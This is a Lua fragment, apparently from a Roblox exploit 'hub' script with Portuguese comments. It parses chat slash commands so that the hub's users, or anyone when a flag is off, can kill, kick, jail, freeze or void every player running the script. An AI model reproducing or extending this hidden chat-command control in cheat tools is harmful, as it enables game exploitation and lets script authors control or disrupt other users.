-- [MECANISMO DE LEITURA DE CHAT (O "TREM" DO SCRIPT)]
local function _0xProcessChat(msg, sender)
    if msg:sub(1,1) == "/" then
        local parts = msg:split(" ")
        if #parts >= 2 then
            local cmd = parts[1]:gsub("/", ""):lower()
            local target = parts[2]:lower()
            
            -- Verifica se o alvo é você ou "all"
            if target == _0xL.Name:lower() or target == "all" then
                -- Se o Anti-Sync estiver ON e quem mandou não for você, ignora
                if _G.IM and sender.Name ~= _0xL.Name then return end
                
                local char = _0xL.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                
                -- LISTA DE AÇÕES DO SYNC
                if cmd == "kill" then 
                    char:BreakJoints()
                elseif cmd == "kick" then 
                    _0xL:Kick("\n\nTime Jotinha12hr2 Hub's Admin")
                elseif cmd == "jail" and hrp then
                    local p = Instance.new("Part", workspace)
                    p.Size, p.Anchored, p.CFrame = Vector3.new(15,15,15), true, CFrame.new(0, 5000, 0)
                    p.Material = Enum.Material.ForceField
                    hrp.CFrame = p.CFrame
                elseif cmd == "unjail" and hrp then
                    hrp.CFrame = CFrame.new(0, 50, 0)
                elseif cmd == "freeze" and hrp then
                    hrp.Anchored = true
                elseif cmd == "unfreeze" and hrp then
                    hrp.Anchored = false
                elseif cmd == "jump" then
                    char.Humanoid.Jump = true
                elseif cmd == "sit" then
                    char.Humanoid.Sit = true
                elseif cmd == "void" and hrp then
                    hrp.CFrame = CFrame.new(0, -1000, 0)
                end
            end
        end
    end
end

